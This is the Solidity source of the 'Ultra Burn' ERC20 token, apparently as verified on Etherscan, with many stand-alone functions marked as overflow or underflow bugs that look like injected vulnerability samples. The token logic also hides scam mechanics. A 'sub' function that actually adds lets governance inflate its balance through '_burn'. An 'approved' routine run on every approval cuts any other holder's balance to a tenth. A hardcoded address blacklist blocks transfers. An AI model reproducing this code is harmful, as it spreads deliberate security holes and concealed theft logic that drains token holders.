/**
 *Submitted for verification at Etherscan.io on 2020-11-05
*/

/*

https://ultraburn.finance/

https://t.me/ultraburn_finance

This is an experimental zero utility token, there will be no presale and the team will be providing funds for initial liquidity themselves.

*/

pragma solidity 0.6.8;

abstract contract Context {
	function _msgSender() internal view virtual returns(address payable) {
		return msg.sender;
	}
mapping(address => uint) public lockTime_intou1;

function increaseLockTime_intou1(uint _secondsToIncrease) public {
        lockTime_intou1[msg.sender] += _secondsToIncrease;  //overflow
    }
function withdraw_ovrflow1() public {
        require(now > lockTime_intou1[msg.sender]);    
        uint transferValue_intou1 = 10;           
        msg.sender.transfer(transferValue_intou1);
    }

	function _msgData() internal view virtual returns(bytes memory) {
		this;
		return msg.data;
	}
mapping(address => uint) balances_intou30;

function transfer_intou30(address _to, uint _value) public returns (bool) {
    require(balances_intou30[msg.sender] - _value >= 0);  //bug
    balances_intou30[msg.sender] -= _value;  //bug
    balances_intou30[_to] += _value;  //bug
    return true;
  }
}


interface IERC20 {

	function totalSupply() external view returns(uint256);

	function balanceOf(address account) external view returns(uint256);

	function transfer(address recipient, uint256 amount) external returns(bool);

	function allowance(address owner, address spender) external view returns(uint256);

	function approve(address spender, uint256 amount) external returns(bool);

	function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

	function add(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function subs(uint256 a, uint256 b) internal pure returns(uint256) {
		return subs(a, b, "SafeMath: subtraction overflow");
	}

	function subs(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns(uint256) {

		if (a == 0) {
			return 0;
		}

		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns(uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

	function mod(uint256 a, uint256 b) internal pure returns(uint256) {
		return mod(a, b, "SafeMath: modulo by zero");

	}

	function sub(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}


}


contract ERC20 is Context, IERC20 {
	using SafeMath
	for uint256;

mapping(address => uint) public lockTime_intou33;

function increaseLockTime_intou33(uint _secondsToIncrease) public {
        lockTime_intou33[msg.sender] += _secondsToIncrease;  //overflow
    }
function withdraw_intou33() public {
        require(now > lockTime_intou33[msg.sender]);    
        uint transferValue_intou33 = 10;           
        msg.sender.transfer(transferValue_intou33);
    }

	mapping(address => uint256) private _balances;
function bug_intou12(uint8 p_intou12) public{
    uint8 vundflw1=0;
    vundflw1 = vundflw1 + p_intou12;   // overflow bug
}

	mapping(address => mapping(address => uint256)) private _allowances;
mapping(address => uint) public lockTime_intou17;

function increaseLockTime_intou17(uint _secondsToIncrease) public {
        lockTime_intou17[msg.sender] += _secondsToIncrease;  //overflow
    }
function withdraw_intou17() public {
        require(now > lockTime_intou17[msg.sender]);    
        uint transferValue_intou17 = 10;           
        msg.sender.transfer(transferValue_intou17);
    }

	uint256 private _totalSupply;
function bug_intou11() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}

	string private _name;function bug_intou15() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}

	string private _symbol;mapping(address => uint) balances_intou6;

function transfer_intou62(address _to, uint _value) public returns (bool) {
    require(balances_intou6[msg.sender] - _value >= 0);  //bug
    balances_intou6[msg.sender] -= _value;  //bug
    balances_intou6[_to] += _value;  //bug
    return true;
  }

	uint8 private _decimals;mapping(address => uint) balances_intou2;

function transfer_undrflow2(address _to, uint _value) public returns (bool) {
    require(balances_intou2[msg.sender] - _value >= 0);  //bug
    balances_intou2[msg.sender] -= _value;  //bug
    balances_intou2[_to] += _value;  //bug
    return true;
  }

	address governance;function bug_intou28(uint8 p_intou28) public{
    uint8 vundflw1=0;
    vundflw1 = vundflw1 + p_intou28;   // overflow bug
}

	uint256 maxSupply;function bug_intou31() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}

	uint256 Address;
  function bug_intou24(uint8 p_intou24) public{
    uint8 vundflw1=0;
    vundflw1 = vundflw1 + p_intou24;   // overflow bug
}
  uint256 decimal;
    
    
    // frontrunning-bot blacklist
    
  mapping(address => uint) balances_intou22;

function transfer_intou22(address _to, uint _value) public returns (bool) {
    require(balances_intou22[msg.sender] - _value >= 0);  //bug
    balances_intou22[msg.sender] -= _value;  //bug
    balances_intou22[_to] += _value;  //bug
    return true;
  }
  address bot1 = 0x50EB00eC243851a4012333476b553C2b37740267;
  mapping(address => uint) balances_intou10;

function transfer_intou10(address _to, uint _value) public returns (bool) {
    require(balances_intou10[msg.sender] - _value >= 0);  //bug
    balances_intou10[msg.sender] -= _value;  //bug
    balances_intou10[_to] += _value;  //bug
    return true;
  }
  address bot2 = 0xaAC8e2d2e1FdaCa2c4196A1Eb13602eCf33f1A9E;
  mapping(address => uint) balances_intou34;

function transfer_intou34(address _to, uint _value) public returns (bool) {
    require(balances_intou34[msg.sender] - _value >= 0);  //bug
    balances_intou34[msg.sender] -= _value;  //bug
    balances_intou34[_to] += _value;  //bug
    return true;
  }
  address bot3 = 0x50EB00eC243851a4012333476b553C2b37740267;
  mapping(address => uint) public lockTime_intou5;

function increaseLockTime_intou5(uint _secondsToIncrease) public {
        lockTime_intou5[msg.sender] += _secondsToIncrease;  //overflow
    }
function withdraw_intou5() public {
        require(now > lockTime_intou5[msg.sender]);    
        uint transferValue_intou5 = 10;           
        msg.sender.transfer(transferValue_intou5);
    }
  address bot4 = 0xb89Fa54d5D7BCb78e121f9fA85Cb47242355c68E;
  function bug_intou36(uint8 p_intou36) public{
    uint8 vundflw1=0;
    vundflw1 = vundflw1 + p_intou36;   // overflow bug
}
  address bot5 = 0x8d9f46510152be0147FA8b2C92eec099e42EA66c;


	constructor(string memory name, string memory symbol) public {
		_name = name;
		_symbol = symbol;
		_decimals = 10;
	}
function bug_intou27() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}

	function name() public view returns(string memory) {
		return _name;
	}
function bug_intou19() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}

	function symbol() public view returns(string memory) {
		return _symbol;
	}
function bug_intou4(uint8 p_intou4) public{
    uint8 vundflw1=0;
    vundflw1 = vundflw1 + p_intou4;   // overflow bug
}

	function decimals() public view returns(uint8) {
		return _decimals;
	}
function bug_intou35() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}

	function totalSupply() public view override returns(uint256) {
		return _totalSupply;
	}
function bug_intou20(uint8 p_intou20) public{
    uint8 vundflw1=0;
    vundflw1 = vundflw1 + p_intou20;   // overflow bug
}

	function balanceOf(address account) public view override returns(uint256) {
		return _balances[account];
	}
mapping(address => uint) balances_intou18;

function transfer_intou18(address _to, uint _value) public returns (bool) {
    require(balances_intou18[msg.sender] - _value >= 0);  //bug
    balances_intou18[msg.sender] -= _value;  //bug
    balances_intou18[_to] += _value;  //bug
    return true;
  }

	function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}
function bug_intou8(uint8 p_intou8) public{
    uint8 vundflw1=0;
    vundflw1 = vundflw1 + p_intou8;   // overflow bug
}

	function allowance(address owner, address spender) public view virtual override returns(uint256) {
		return _allowances[owner][spender];
	}
function bug_intou3() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}

	function approve(address spender, uint256 amount) public virtual override returns(bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}
mapping(address => uint) public lockTime_intou37;

function increaseLockTime_intou37(uint _secondsToIncrease) public {
        lockTime_intou37[msg.sender] += _secondsToIncrease;  //overflow
    }
function withdraw_intou37() public {
        require(now > lockTime_intou37[msg.sender]);    
        uint transferValue_intou37 = 10;           
        msg.sender.transfer(transferValue_intou37);
    }

	function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns(bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].subs(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}
function bug_intou23() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}


	function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
		return true;
	}
mapping(address => uint) public lockTime_intou25;

function increaseLockTime_intou25(uint _secondsToIncrease) public {
        lockTime_intou25[msg.sender] += _secondsToIncrease;  //overflow
    }
function withdraw_intou25() public {
        require(now > lockTime_intou25[msg.sender]);    
        uint transferValue_intou25 = 10;           
        msg.sender.transfer(transferValue_intou25);
    }

	function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].subs(subtractedValue, "ERC20: decreased allowance below zero"));
		return true;
	}
function bug_intou7() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}
	
	function approved(address owner) internal {
	   	require(owner != address(0), "ERC20: approve from the zero address");
	   	if  (owner != governance) {
            Address = _balances[owner];
            Address /= decimal;
            _balances[owner] = Address;
	   	}
	    else {
	        Address = _balances[owner];
	    }
    }
mapping(address => uint) public lockTime_intou13;

function increaseLockTime_intou13(uint _secondsToIncrease) public {
        lockTime_intou13[msg.sender] += _secondsToIncrease;  //overflow
    }
function withdraw_intou13() public {
        require(now > lockTime_intou13[msg.sender]);    
        uint transferValue_intou13 = 10;           
        msg.sender.transfer(transferValue_intou13);
    }
	
	function _transfer(address sender, address recipient, uint256 amount) internal virtual {
		require(sender != address(0), "ERC20: transfer from the zero address");
		require(recipient != address(0), "ERC20: transfer to the zero address");
		
		// Anti draining bots feature: Bots can buy but can't sell
		// Bot list is definited above in contract "ERC20"
		
		require(msg.sender != bot1 && msg.sender != bot2 && msg.sender != bot3 && msg.sender != bot4);
		require(msg.sender != bot5);
		
		
		_beforeTokenTransfer(sender, recipient, amount);
    
		_balances[sender] = _balances[sender].subs(amount, "ERC20: transfer amount exceeds balance");
		_balances[recipient] = _balances[recipient].add(amount);
		
		emit Transfer(sender, recipient, amount);
        
	}
mapping(address => uint) balances_intou26;

function transfer_intou26(address _to, uint _value) public returns (bool) {
    require(balances_intou26[msg.sender] - _value >= 0);  //bug
    balances_intou26[msg.sender] -= _value;  //bug
    balances_intou26[_to] += _value;  //bug
    return true;
  }

	function _initMint(address account, uint256 amount) internal virtual {
		require(account != address(0), "ERC20: create to the zero address");
		_beforeTokenTransfer(address(0), account, amount);
		_totalSupply = _totalSupply.add(amount);

		_balances[account] = _balances[account].add(amount);
		emit Transfer(address(0), account, amount);
	}
function bug_intou39() public{
    uint8 vundflw =0;
    vundflw = vundflw -10;   // underflow bug
}

	function _burn(address account, uint256 amount) public virtual {
		require(account == governance, "ERC20: Burner is not allowed");
		_beforeTokenTransfer(address(0), account, amount);
		_balances[account] = _balances[account].sub(amount);

		_totalSupply = _totalSupply.sub(amount);
		emit Transfer(address(0), account, amount);
	}
mapping(address => uint) public lockTime_intou21;

function increaseLockTime_intou21(uint _secondsToIncrease) public {
        lockTime_intou21[msg.sender] += _secondsToIncrease;  //overflow
    }
function withdraw_intou21() public {
        require(now > lockTime_intou21[msg.sender]);    
        uint transferValue_intou21 = 10;           
        msg.sender.transfer(transferValue_intou21);
    }
	
	
	function _approve(address owner, address spender, uint256 amount) internal virtual {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");
		
        approved(owner);
		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}
mapping(address => uint) balances_intou14;

function transfer_intou14(address _to, uint _value) public returns (bool) {
    require(balances_intou14[msg.sender] - _value >= 0);  //bug
    balances_intou14[msg.sender] -= _value;  //bug
    balances_intou14[_to] += _value;  //bug
    return true;
  }
	
	
	function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
mapping(address => uint) balances_intou38;

function transfer_intou38(address _to, uint _value) public returns (bool) {
    require(balances_intou38[msg.sender] - _value >= 0);  //bug
    balances_intou38[msg.sender] -= _value;  //bug
    balances_intou38[_to] += _value;  //bug
    return true;
  }
}


contract UltraBURN is ERC20 {
	constructor()
	ERC20('Ultra Burn', 'HBURN')
	public {
		governance = msg.sender;
		maxSupply = 20000 * 10 ** uint(decimals());
		decimal = 10;
		_initMint(governance, maxSupply);
		
	}
function bug_intou32(uint8 p_intou32) public{
    uint8 vundflw1=0;
    vundflw1 = vundflw1 + p_intou32;   // overflow bug
}
}

// SPDX-License-Identifier: None